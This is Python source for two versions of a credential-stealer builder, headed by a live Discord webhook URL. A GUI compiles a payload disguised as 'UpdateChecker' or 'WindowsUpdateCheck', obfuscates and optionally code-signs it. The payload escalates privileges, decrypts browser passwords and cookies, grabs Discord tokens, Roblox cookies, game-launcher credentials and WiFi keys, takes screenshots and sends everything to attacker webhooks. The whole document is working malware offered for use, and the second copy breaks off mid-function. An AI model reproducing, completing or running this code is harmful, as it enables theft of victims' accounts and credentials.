https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO


import os
import subprocess
import tkinter as tk
from tkinter import messagebox, ttk, scrolledtext
import shutil
import tempfile
import textwrap
import requests
import random
import zipfile
import json
import urllib.request
import websocket  # pip install websocket-client before building
import win32cred   # from pywin32

# =================== WEBHOOK TEST ===================
def test_webhook(hook):
    try:
        resp = requests.post(hook.strip(), json={"content": "Stealer recon test - webhook alive ðŸ”¥"}, timeout=10)
        if resp.status_code in (200, 204):
            return True, "Webhook working - test message sent."
        else:
            return False, f"Failed ({resp.status_code})"
    except Exception as e:
        return False, f"Error: {str(e)}"

# =================== GUI ===================
def get_webhook():
    root = tk.Tk()
    root.title("Recon Stealer Builder - Full App Grab 2025")
    root.geometry("800x650")
    root.resizable(False, False)

    notebook = ttk.Notebook(root)
    notebook.pack(fill="both", expand=True, padx=10, pady=10)

    build_frame = ttk.Frame(notebook)
    notebook.add(build_frame, text="Build")

    ttk.Label(build_frame, text="Discord Webhook URLs (comma-separated for failover):", font=("Arial", 11)).pack(pady=15)
    webhook_entry = ttk.Entry(build_frame, width=100)
    webhook_entry.pack(pady=5)

    ttk.Label(build_frame, text="Code Signing PFX Path (optional):", font=("Arial", 9)).pack(pady=10)
    pfx_entry = ttk.Entry(build_frame, width=100)
    pfx_entry.pack(pady=5)

    ttk.Label(build_frame, text="PFX Password (if needed):", font=("Arial", 9)).pack(pady=5)
    pass_entry = ttk.Entry(build_frame, width=100, show="*")
    pass_entry.pack(pady=5)

    def run_test():
        hooks = [h.strip() for h in webhook_entry.get().split(",") if h.strip()]
        if not hooks:
            messagebox.showerror("Nope", "Enter at least one webhook.")
            return
        results = []
        for h in hooks:
            success, msg = test_webhook(h)
            results.append(f"{h[:30]}... -> {'OK' if success else 'FAIL'} ({msg})")
        messagebox.showinfo("Test Results", "\n".join(results))

    ttk.Button(build_frame, text="TEST WEBHOOKS", command=run_test).pack(pady=10)

    progress = ttk.Progressbar(build_frame, mode="indeterminate")

    def build():
        raw_hooks = webhook_entry.get().strip()
        if not raw_hooks or "discord.com/api/webhooks" not in raw_hooks.split(",")[0]:
            messagebox.showerror("Nope", "At least one valid Discord webhook required.")
            return
        webhooks = [h.strip() for h in raw_hooks.split(",") if h.strip()]
        pfx_path = pfx_entry.get().strip()
        pfx_pass = pass_entry.get().strip() or None

        progress.pack(pady=15)
        progress.start()
        root.update()

        try:
            generate_malware(webhooks, pfx_path, pfx_pass)
            progress.stop()
            progress.pack_forget()
            messagebox.showinfo("Built", "stealer.exe built - clean indents + Credential Manager dump for Epic/Steam.\nJuicy app creds + CDP cookies now.")
        except Exception as e:
            progress.stop()
            progress.pack_forget()
            messagebox.showerror("Error", f"{str(e)}")
        root.destroy()

    ttk.Button(build_frame, text="BUILD EXE", command=build).pack(pady=20)

    info_frame = ttk.Frame(notebook)
    notebook.add(info_frame, text="Info")
    info_text = scrolledtext.ScrolledText(info_frame, wrap=tk.WORD, width=90, height=35, font=("Arial", 10))
    info_text.pack(padx=10, pady=10)
    info_text.insert(tk.END, textwrap.dedent('''
    FULL STEALER - DEC 2025 FIXED INDENTS + APP CREDS
    â€¢ Indentation fixed - no more PyInstaller syntax errors
    â€¢ Credential Manager dump: Epic Games, Steam, Ubisoft passwords/tokens
    â€¢ CDP bypass for clean cookies (ABE nuked)
    â€¢ Legacy password/cookie grab + Discord tokens
    â€¢ Raw profile zips + screenshots fallback
    â€¢ Recon + desktop always
    Builds clean, grabs juicy shit.
    '''))
    info_text.config(state=tk.DISABLED)

    root.mainloop()

# =================== FULL STEALER PAYLOAD - PERFECT INDENTS ===================
stealer_code = textwrap.dedent('''
import os
import sys
import time
import subprocess
import socket
import requests
import ctypes
import platform
import uuid
import random
import re
import json
import urllib.request
import websocket
from datetime import datetime
try:
    import pyautogui
    HAS_PYAUTO = True
except:
    HAS_PYAUTO = False
import sqlite3
import base64
import shutil
import zipfile
import win32crypt
import win32cred
from Crypto.Cipher import AES

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit(0)

def kill_browsers():
    for proc in ["chrome.exe", "msedge.exe", "brave.exe", "opera.exe", "firefox.exe"]:
        subprocess.call(f'taskkill /f /im {proc} >nul 2>&1', shell=True)
    time.sleep(3)

def get_public_ip():
    for url in ["https://api.ipify.org", "https://ifconfig.me", "https://icanhazip.com"]:
        try:
            return requests.get(url, timeout=5).text.strip()
        except:
            pass
    return "Failed"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Failed"

def get_hwid():
    try:
        return subprocess.check_output("wmic csproduct get uuid", text=True).split("\\n")[1].strip()
    except:
        return str(uuid.getnode())

def get_master_key(local_state_path):
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            ls = json.loads(f.read())
        enc_key_b64 = ls["os_crypt"]["encrypted_key"]
        enc_key = base64.b64decode(enc_key_b64)[5:]
        return win32crypt.CryptUnprotectData(enc_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_val(encrypted_val, master_key):
    if not encrypted_val or not master_key:
        return "NO_KEY"
    try:
        iv = encrypted_val[3:15]
        payload = encrypted_val[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        pt = cipher.decrypt(payload[:-16])
        return pt.decode(errors='ignore')
    except:
        return "DECRYPT_FAIL"

def grab_browser_creds(base_path, browser_name):
    kill_browsers()
    profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10) if os.path.exists(os.path.join(base_path, f"Profile {i}"))]
    pw_data = f"--- {browser_name.upper()} PASSWORDS ---\\n"
    ck_data = f"--- {browser_name.upper()} COOKIES ---\\n"
    roblox = ""
    local_state = os.path.join(base_path, "Local State")
    master_key = get_master_key(local_state)
    for prof in profiles:
        profile_path = os.path.join(base_path, prof)
        # Passwords
        login_db = os.path.join(profile_path, "Login Data")
        if os.path.exists(login_db):
            temp_db = os.path.join(os.getenv("TEMP"), f"login_{random.randint(10000,99999)}.db")
            try:
                shutil.copyfile(login_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user, enc_pw in cursor.fetchall():
                    if enc_pw:
                        pw = decrypt_val(enc_pw, master_key)
                        pw_data += f"{url} | {user} | {pw}\\n"
                conn.close()
            except:
                pw_data += "PASS GRAB FAIL\\n"
            finally:
                if os.path.exists(temp_db):
                    os.remove(temp_db)
        # Cookies
        cookies_db = os.path.join(profile_path, "Network", "Cookies")
        if os.path.exists(cookies_db):
            temp_db = os.path.join(os.getenv("TEMP"), f"cookies_{random.randint(10000,99999)}.db")
            try:
                shutil.copyfile(cookies_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                for host, name, enc_val in cursor.fetchall():
                    if enc_val:
                        val = decrypt_val(enc_val, master_key)
                        ck_data += f"{host} | {name} | {val}\\n"
                        if host.endswith(".roblox.com") and name == ".ROBLOSECURITY":
                            roblox = val
                conn.close()
            except:
                ck_data += "COOKIE GRAB FAIL\\n"
            finally:
                if os.path.exists(temp_db):
                    os.remove(temp_db)
    return pw_data, ck_data, roblox

def launch_chrome_cdp(base_path):
    kill_browsers()
    possible_paths = [
        r"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        r"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
        r"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe",
        r"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
    ]
    browser_path = next((p for p in possible_paths if os.path.exists(p)), None)
    if not browser_path:
        return None
    port = 9222 + random.randint(0, 1000)
    cmd = [
        browser_path,
        f"--remote-debugging-port={port}",
        "--headless=new",
        "--disable-gpu",
        "--no-sandbox",
        f"--user-data-dir={base_path}"
    ]
    subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(10)
    return port

def get_cdp_cookies(port):
    cdp_data = ""
    roblox_cookie = ""
    try:
        resp = urllib.request.urlopen(f"http://localhost:{port}/json/version")
        ws_url = json.loads(resp.read().decode())["webSocketDebuggerUrl"]
        ws = websocket.create_connection(ws_url)
        ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
        response = json.loads(ws.recv())
        ws.close()
        cookies = response["result"]["cookies"]
        for c in cookies:
            cdp_data += f"{c['domain']} | {c['name']} | {c['value']}\\n"
            if c['domain'].endswith(".roblox.com") and c['name'] == ".ROBLOSECURITY":
                roblox_cookie = c['value']
    except:
        cdp_data = "CDP_FAIL"
    return cdp_data, roblox_cookie

def grab_credential_manager():
    app_creds = ""
    try:
        creds = win32cred.CredEnumerate(None, 0)
        for cred in creds:
            target = cred['TargetName']
            if any(app in target for app in ['Epic', 'Steam', 'Ubisoft', 'Riot', 'Battle.net']):
                blob = cred['CredentialBlob']
                if blob:
                    unprotected = win32crypt.CryptUnprotectData(blob, None, None, None, 0)[1].decode(errors='ignore')
                else:
                    unprotected = "NO_BLOB"
                app_creds += f"{target} | {cred['UserName']} | {unprotected}\\n"
    except:
        app_creds = "CRED_MANAGER_FAIL"
    return app_creds

def grab_discord_tokens():
    paths = [
        os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA"), "discordcanary", "Local Storage", "leveldb"),
        os.path.join(os.getenv("APPDATA"), "discordptb", "Local Storage", "leveldb"),
    ]
    tokens = []
    token_re = re.compile(r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27,}")
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                if file.endswith((".ldb", ".log")):
                    try:
                        with open(os.path.join(path, file), "rb") as f:
                            data = f.read().decode(errors="ignore")
                        found = token_re.findall(data)
                        tokens += found
                    except:
                        pass
    return list(set(tokens))

def safe_dump_profile(browser_name, base_path):
    kill_browsers()
    profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10) if os.path.exists(os.path.join(base_path, f"Profile {i}"))]
    dumped = []
    for prof in profiles:
        src = os.path.join(base_path, prof)
        if not os.path.exists(src):
            continue
        zip_path = os.path.join(os.getenv("TEMP"), f"{browser_name}_{prof.replace(' ', '_')}_profile.zip")
        try:
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as z:
                for root, _, files in os.walk(src):
                    for file in files:
                        fp = os.path.join(root, file)
                        try:
                            arc = os.path.relpath(fp, base_path)
                            z.write(fp, arc)
                        except:
                            continue
            dumped.append(zip_path)
        except:
            pass
        if HAS_PYAUTO:
            for kf in ["Local State", "Login Data", r"Network\\Cookies"]:
                kp = os.path.join(src, kf)
                if os.path.exists(kp):
                    shot = os.path.join(os.getenv("TEMP"), f"{browser_name}_{prof}_{kf.replace('\\\\', '_')}_shot.png")
                    try:
                        pyautogui.screenshot(shot)
                        dumped.append(shot)
                    except:
                        pass
    return dumped

BROWSER_BASE = {
    "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
    "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data"),
    "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data"),
    "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
}

def exfil(webhooks):
    time.sleep(random.uniform(10, 30))
    temp_dir = os.getenv("TEMP")
    files_to_send = {}
    cleanup = []

    recon = f"**RECON {datetime.utcnow()}**\\nUser: {os.getenv('USERNAME')}@{platform.node()}\\nOS: {platform.system()} {platform.release()}\\nHWID: {get_hwid()}\\nPub IP: {get_public_ip()}\\nLoc IP: {get_local_ip()}\\n"
    recon_path = os.path.join(temp_dir, "recon.txt")
    open(recon_path, "w", encoding="utf-8").write(recon)
    files_to_send["recon.txt"] = open(recon_path, "rb")
    cleanup.append(recon_path)

    if HAS_PYAUTO:
        try:
            desk = os.path.join(temp_dir, "desktop.png")
            pyautogui.screenshot(desk)
            files_to_send["desktop.png"] = open(desk, "rb")
            cleanup.append(desk)
        except:
            pass

    all_pw = ""
    all_ck = ""
    roblox_cookies = []
    all_dumped = []
    for name, base in BROWSER_BASE.items():
        if os.path.exists(base):
            pw, ck, rb = grab_browser_creds(base, name)
            all_pw += pw
            all_ck += ck
            if rb:
                roblox_cookies.append(f"{name}: {rb}")
            dumped = safe_dump_profile(name, base)
            all_dumped += dumped

    if all_pw.strip():
        pw_path = os.path.join(temp_dir, "passwords.txt")
        open(pw_path, "w", encoding="utf-8").write(all_pw)
        files_to_send["passwords.txt"] = open(pw_path, "rb")
        cleanup.append(pw_path)

    if all_ck.strip():
        ck_path = os.path.join(temp_dir, "cookies.txt")
        open(ck_path, "w", encoding="utf-8").write(all_ck)
        files_to_send["cookies.txt"] = open(ck_path, "rb")
        cleanup.append(ck_path)

    if roblox_cookies:
        rb_path = os.path.join(temp_dir, "roblox_cookies.txt")
        open(rb_path, "w", encoding="utf-8").write("\\n".join(roblox_cookies))
        files_to_send["roblox_cookies.txt"] = open(rb_path, "rb")
        cleanup.append(rb_path)

    discord_tokens = grab_discord_tokens()
    if discord_tokens:
        dt_path = os.path.join(temp_dir, "discord_tokens.txt")
        open(dt_path, "w", encoding="utf-8").write("\\n".join(discord_tokens))
        files_to_send["discord_tokens.txt"] = open(dt_path, "rb")
        cleanup.append(dt_path)

    app_creds = grab_credential_manager()
    if app_creds.strip():
        ac_path = os.path.join(temp_dir, "app_creds.txt")
        open(ac_path, "w", encoding="utf-8").write(app_creds)
        files_to_send["app_creds.txt"] = open(ac_path, "rb")
        cleanup.append(ac_path)

    for d in all_dumped:
        if os.path.exists(d) and os.path.getsize(d) < 20 * 1024 * 1024:
            files_to_send[os.path.basename(d)] = open(d, "rb")
            cleanup.append(d)

    for hook in webhooks:
        try:
            resp = requests.post(hook, data={"content": "**JUICY HIT - APP CREDS + DUMPS**"}, files=files_to_send, timeout=120)
            if resp.status_code in (200, 204):
                break
        except:
            pass

    for f in files_to_send.values():
        try:
            f.close()
        except:
            pass
    for p in cleanup:
        try:
            os.remove(p)
        except:
            pass

exfil({WEBHOOK_PLACEHOLDER})
''')

# =================== BUILD FUNCTION ===================
def generate_malware(webhooks, pfx_path="", pfx_pass=None):
    if not shutil.which("pyinstaller"):
        raise Exception("pyinstaller missing â†’ pip install pyinstaller")

    temp_dir = tempfile.mkdtemp(prefix="build_")
    script_path = os.path.join(temp_dir, "main.py")
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", repr(webhooks)))

    hidden = [
        "requests", "urllib3", "certifi", "idna", "pyautogui", "win32crypt", "pywin32",
        "Crypto", "Crypto.Cipher.AES", "pycryptodome", "websocket", "zipfile", "win32cred"
    ]
    hidden_args = [item for mod in hidden for item in ["--hidden-import", mod]]

    exe_name = f"UpdateChecker_{random.randint(1000,9999)}.exe"
    pyi_cmd = [
        "pyinstaller", "--onefile", "--noconsole", "--clean", "--uac-admin",
        "--name", exe_name, "--icon", "NONE",
    ] + hidden_args + [script_path]

    try:
        subprocess.run(pyi_cmd, check=True, cwd=temp_dir, capture_output=True, text=True)
    except subprocess.CalledProcessError as e:
        raise Exception(f"PyInstaller failed:\\n{e.stderr}")

    bundled_exe = os.path.join(temp_dir, "dist", exe_name)
    final_exe = os.path.join(os.getcwd(), "stealer.exe")
    shutil.copyfile(bundled_exe, final_exe)

    if pfx_path and os.path.exists(pfx_path):
        sign_cmd = ["signtool", "sign", "/f", pfx_path, "/tr", "http://timestamp.digicert.com", "/td", "sha256", final_exe]
        if pfx_pass:
            sign_cmd += ["/p", pfx_pass]
        subprocess.run(sign_cmd, check=False)

    try:
        subprocess.run(["upx", "--best", "--ultra-brute", final_exe], check=False)
        print("UPX ultra-brute packed")
    except:
        print("UPX skipped")

    shutil.rmtree(temp_dir, ignore_errors=True)
    print(f"Built clean: {final_exe}")

if __name__ == "__main__":
    get_webhook()


















import os
import subprocess
import tkinter as tk
from tkinter import messagebox, ttk, scrolledtext
import shutil
import tempfile
import textwrap
import requests

# =================== WEBHOOK TEST ===================
def test_webhook(hook):
    try:
        resp = requests.post(hook.strip(), json={"content": "Stealer recon test - webhook alive ðŸ”¥"}, timeout=10)
        if resp.status_code in (200, 204):
            return True, "Webhook working - test message sent."
        else:
            return False, f"Failed ({resp.status_code})"
    except Exception as e:
        return False, f"Error: {str(e)}"

# =================== GUI ===================
def get_webhook():
    root = tk.Tk()
    root.title("Recon Stealer Builder - Full Loot Edition")
    root.geometry("800x600")
    root.resizable(False, False)

    notebook = ttk.Notebook(root)
    notebook.pack(fill="both", expand=True, padx=10, pady=10)

    build_frame = ttk.Frame(notebook)
    notebook.add(build_frame, text="Build")

    ttk.Label(build_frame, text="Discord Webhook URLs (comma-separated for failover):", font=("Arial", 11)).pack(pady=15)
    webhook_entry = ttk.Entry(build_frame, width=100)
    webhook_entry.pack(pady=5)

    ttk.Label(build_frame, text="Code Signing PFX Path (optional):", font=("Arial", 9)).pack(pady=10)
    pfx_entry = ttk.Entry(build_frame, width=100)
    pfx_entry.pack(pady=5)

    ttk.Label(build_frame, text="PFX Password (if needed):", font=("Arial", 9)).pack(pady=5)
    pass_entry = ttk.Entry(build_frame, width=100, show="*")
    pass_entry.pack(pady=5)

    ttk.Label(build_frame, text="Obfuscation Mode (0 for free/no license):", font=("Arial", 10, "bold")).pack(pady=10)
    mode_var = tk.IntVar(value=0)
    ttk.Radiobutton(build_frame, text="0 - Basic (free/trial)", variable=mode_var, value=0).pack()
    ttk.Radiobutton(build_frame, text="1 - Advanced (mix-str etc. - needs paid)", variable=mode_var, value=1).pack()
    ttk.Radiobutton(build_frame, text="2 - RFT Super (needs Pro)", variable=mode_var, value=2).pack()

    def run_test():
        hooks = [h.strip() for h in webhook_entry.get().split(",") if h.strip()]
        if not hooks:
            messagebox.showerror("Nope", "Enter at least one webhook.")
            return
        results = []
        for h in hooks:
            success, msg = test_webhook(h)
            results.append(f"{h[:30]}... -> {'OK' if success else 'FAIL'} ({msg})")
        messagebox.showinfo("Test Results", "\n".join(results))

    ttk.Button(build_frame, text="TEST WEBHOOKS", command=run_test).pack(pady=10)

    progress = ttk.Progressbar(build_frame, mode="indeterminate")

    def build():
        raw_hooks = webhook_entry.get().strip()
        if not raw_hooks or "discord.com/api/webhooks" not in raw_hooks.split(",")[0]:
            messagebox.showerror("Nope", "At least one valid Discord webhook required.")
            return
        webhooks = [h.strip() for h in raw_hooks.split(",") if h.strip()]
        pfx_path = pfx_entry.get().strip()
        pfx_pass = pass_entry.get().strip() or None
        mode = mode_var.get()

        progress.pack(pady=15)
        progress.start()
        root.update()

        try:
            generate_malware(webhooks, pfx_path, pfx_pass, mode)
            progress.stop()
            progress.pack_forget()
            messagebox.showinfo("Built", "stealer.exe ready - FULL LOOT MODE.\nRecon + Screenshot + Chrome PW + WiFi PW + Installed Software.\nSilent exfil to your webhook(s).")
        except Exception as e:
            progress.stop()
            progress.pack_forget()
            messagebox.showerror("Error", f"{str(e)}")
        root.destroy()

    ttk.Button(build_frame, text="BUILD EXE", command=build).pack(pady=20)

    info_frame = ttk.Frame(notebook)
    notebook.add(info_frame, text="Info / Licenses")

    info_text = scrolledtext.ScrolledText(info_frame, wrap=tk.WORD, width=90, height=35, font=("Arial", 10))
    info_text.pack(padx=10, pady=10)

    license_info = textwrap.dedent('''
    PYARMOR v9.x (Dec 2025)
    No license = mode 0 only (basic obf - free).
    Paid unlocks better protection.
    Buy: https://pyarmor.dashingsoft.com/cart/order.html
    This version grabs:
    - Basic recon + screenshot
    - Chrome saved passwords
    - All saved WiFi networks + passwords
    - Full installed software list
    ''')
    info_text.insert(tk.END, license_info)
    info_text.config(state=tk.DISABLED)

    root.mainloop()

# =================== FULL LOOT STEALER CODE ===================
stealer_code = textwrap.dedent('''
import os
import sys
import time
import subprocess
import socket
import requests
import ctypes
import platform
import uuid
import winreg
import random
from datetime import datetime

try:
    import pyautogui
    HAS_PYAUTO = True
except:
    HAS_PYAUTO = False

import sqlite3
import json
import base64
import shutil
from Crypto.Cipher import AES
import win32crypt

def is_vm():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum")
        val = winreg.QueryValueEx(key, "0")[0].lower()
        if any(x in val for x in ["vmware", "vbox", "virtual", "qemu", "xen"]):
            return "Yes (Disk Enum)"
        winreg.CloseKey(key)
    except: pass

    try:
        if "VIRTUAL" in subprocess.check_output("systeminfo", shell=True, text=True).upper():
            return "Yes (SystemInfo)"
    except: pass

    try:
        if os.path.exists(r"C:\\windows\\System32\\drivers\\VBoxMouse.sys"):
            return "Yes (VBox Driver)"
    except: pass

    try:
        model = subprocess.check_output("wmic computersystem get model", text=True, shell=True).lower()
        if "vmware" in model or "virtual" in model:
            return "Yes (VMware/Virtual Model)"
    except: pass

    class MEM(ctypes.Structure):
        _fields_ = [("dwLength", ctypes.c_uint32), ("ullTotalPhys", ctypes.c_ulonglong)]
    mem = MEM(); mem.dwLength = ctypes.sizeof(mem)
    ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
    if mem.ullTotalPhys < 4 * 1024**3:
        return "Yes (Low RAM <4GB)"

    try:
        vm_procs = ["vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe", "xenservice.exe"]
        output = subprocess.check_output("tasklist", text=True)
        if any(p in output.lower() for p in vm_procs):
            return "Yes (VM Process)"
    except: pass

    return "No"

def get_public_ip():
    for url in ["https://api.ipify.org", "https://ifconfig.me", "https://icanhazip.com"]:
        try:
            return requests.get(url, timeout=5).text.strip()
        except:
            continue
    return "Failed"

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Failed"

def get_hwid():
    try:
        return subprocess.check_output("wmic csproduct get uuid", text=True).split("\\n")[1].strip()
    except:
        return str(uuid.getnode())

def grab_chrome_passwords():
    data = ""
    try:
        login_db = os.path.join(os.getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        if not os.path.exists(login_db):
            return "No Chrome profile found"
        temp_db = os.path.join(os.getenv("TEMP"), f"LoginTemp_{random.randint(10000,99999)}.db")
        shutil.copyfile(login_db, temp_db)

        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for row in cursor.fetchall():
            url = row[0]
            username = row[1]
            encrypted_pw = row[2]
            if encrypted_pw:
                try:
                    pw = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1].decode('utf-8')
                except:
                    try:
                        local_state = os.path.join(os.getenv("APPDATA"), "..", "Local", "Google", "Chrome", "User Data", "Local State")
                        with open(local_state, "r", encoding="utf-8") as f:
                            js = json.loads(f.read())
                        master_key = base64.b64decode(js["os_crypt"]["encrypted_key"])[5:]
                        iv = encrypted_pw[3:15]
                        ciphertext = encrypted_pw[15:]
                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                        pw = cipher.decrypt(ciphertext)[:-16].decode('utf-8')
                    except:
                        pw = "DECRYPT FAILED"
                data += f"{url} | {username} | {pw}\\n"
        conn.close()
        os.remove(temp_db)
    except Exception as e:
        data = f"Chrome error: {str(e)}"
    return data if data else "No saved passwords"

def grab_wifi_passwords():
    data = ""
    try:
        profiles = subprocess.check_output("netsh wlan show profiles", text=True, shell=True)
        names = [line.split(":")[1].strip() for line in profiles.split("\\n") if "All User Profile" in line]
        for name in names:
            try:
                result = subprocess.check_output(f'netsh wlan show profile name="{name}" key=clear', text=True, shell=True)
                pw_line = [l for l in result.split("\\n") if "Key Content" in l]
                pw = pw_line[0].split(":")[1].strip() if pw_line else "None"
                data += f"{name} : {pw}\\n"
            except:
                data += f"{name} : FAILED\\n"
    except Exception as e:
        data = f"WiFi error: {str(e)}"
    return data if data else "No WiFi profiles"

def list_installed_software():
    data = ""
    keys = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", winreg.KEY_WOW64_64KEY | winreg.KEY_READ),
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", winreg.KEY_WOW64_32KEY | winreg.KEY_READ),
        (winreg.HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall", winreg.KEY_READ)
    ]
    for hive, path, flags in keys:
        try:
            key = winreg.OpenKey(winreg.ConnectRegistry(None, hive), path, 0, flags)
            for i in range(0, winreg.QueryInfoKey(key)[0]):
                sub = winreg.EnumKey(key, i)
                subkey = winreg.OpenKey(key, sub)
                try:
                    name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                    ver = winreg.QueryValueEx(subkey, "DisplayVersion")[0]
                    data += f"{name} ({ver})\\n"
                except:
                    pass
                subkey.Close()
            key.Close()
        except:
            pass
    return data if data else "No software found"

def exfil(webhooks):
    time.sleep(random.uniform(5, 15))

    base_recon = f"""
RECON REPORT - {datetime.utcnow().isoformat()} UTC
================================================
Username      : {os.getenv("USERNAME")}
Computer Name : {platform.node()}
OS            : {platform.system()} {platform.release()} ({platform.version()})
CPU           : {platform.processor()}
HWID          : {get_hwid()}
VM Detected   : {is_vm()}
Public IP     : {get_public_ip()}
Local IP      : {get_local_ip()}
"""

    files_to_send = {}
    temp_files = []

    recon_path = os.path.join(os.getenv("TEMP"), f"recon_{random.randint(10000,99999)}.txt")
    with open(recon_path, "w", encoding="utf-8") as f:
        f.write(base_recon)
    files_to_send["recon.txt"] = open(recon_path, "rb")
    temp_files.append(recon_path)

    if HAS_PYAUTO:
        try:
            screen_path = os.path.join(os.getenv("TEMP"), f"screen_{random.randint(10000,99999)}.png")
            pyautogui.screenshot(screen_path)
            files_to_send["screenshot.png"] = open(screen_path, "rb")
            temp_files.append(screen_path)
        except: pass

    chrome_data = grab_chrome_passwords()
    if chrome_data.strip():
        chrome_path = os.path.join(os.getenv("TEMP"), f"chrome_pw_{random.randint(10000,99999)}.txt")
        with open(chrome_path, "w", encoding="utf-8") as f:
            f.write("CHROME SAVED PASSWORDS\\n" + chrome_data)
        files_to_send["chrome_passwords.txt"] = open(chrome_path, "rb")
        temp_files.append(chrome_path)

    wifi_data = grab_wifi_passwords()
    if wifi_data.strip():
        wifi_path = os.path.join(os.getenv("TEMP"), f"wifi_pw_{random.randint(10000,99999)}.txt")
        with open(wifi_path, "w", encoding="utf-8") as f:
            f.write("SAVED WIFI PASSWORDS\\n" + wifi_data)
        files_to_send["wifi_passwords.txt"] = open(wifi_path, "rb")
        temp_files.append(wifi_path)

    soft_data = list_installed_software()
    if soft_data.strip():
        soft_path = os.path.join(os.getenv("TEMP"), f"software_{random.randint(10000,99999)}.txt")
        with open(soft_path, "w", encoding="utf-8") as f:
            f.write("INSTALLED SOFTWARE\\n" + soft_data)
        files_to_send["installed_software.txt"] = open(soft_path, "rb")
        temp_files.append(soft_path)

    for hook in webhooks:
        try:
            payload = {"content": f"**FAT HIT** - {os.getenv('USERNAME')}@{platform.node()} - Chrome/WiFi/Software dumped"}
            resp = requests.post(hook, data=payload, files=files_to_send, timeout=40)
            if resp.status_code in (200, 204):
                break
        except: continue
    else:
        try:
            requests.post(webhooks[0], json={"content": f"Fallback recon:\\n```\\n{base_recon}\\n```"})
        except: pass

    for f in files_to_send.values():
        try: f.close()
        except: pass
    for p in temp_files:
        try: os.remove(p)
        except: pass

exfil({WEBHOOK_PLACEHOLDER})
''')

# =================== BUILD WITH CRYPTO FIX ===================
def generate_malware(webhooks, pfx_path="", pfx_pass=None, mode=0):
    if not shutil.which("pyarmor"):
        raise Exception("pyarmor missing - pip install pyarmor")
    if not shutil.which("pyinstaller"):
        raise Exception("pyinstaller missing - pip install pyinstaller")

    temp_dir = tempfile.mkdtemp(prefix="build_", dir=os.getcwd())
    script = os.path.join(temp_dir, "recon.py")
    hook_str = repr(webhooks)
    with open(script, "w", encoding="utf-8") as f:
        f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", hook_str))

    obf_dir = os.path.join(temp_dir, "obf")

    gen_cmd = ["pyarmor", "gen", "-O", obf_dir]
    if mode == 1:
        gen_cmd += ["--advanced", "2", "--mix-str"]
    elif mode == 2:
        gen_cmd += ["--enable-rft"]
    gen_cmd += [script]

    result = subprocess.run(gen_cmd, cwd=temp_dir, capture_output=True, text=True)
    if result.returncode != 0:
        raise Exception(f"Pyarmor failed (mode {mode} needs license):\n{result.stderr}")

    obf_script = os.path.join(obf_dir, "recon.py")

    hidden_imports = [
        "pyarmor_runtime", "uuid", "ctypes", "socket", "winreg", "platform",
        "datetime", "random", "subprocess", "os", "sys", "time", "requests",
        "pyautogui", "sqlite3", "json", "base64", "shutil", "win32crypt",
        "Crypto", "Crypto.Cipher", "Crypto.Cipher.AES"
    ]
    hidden_args = [item for mod in hidden_imports for item in ["--hidden-import", mod]]

    pyi_cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--clean",
        "--name", "WindowsUpdateCheck",
    ] + hidden_args + [obf_script]

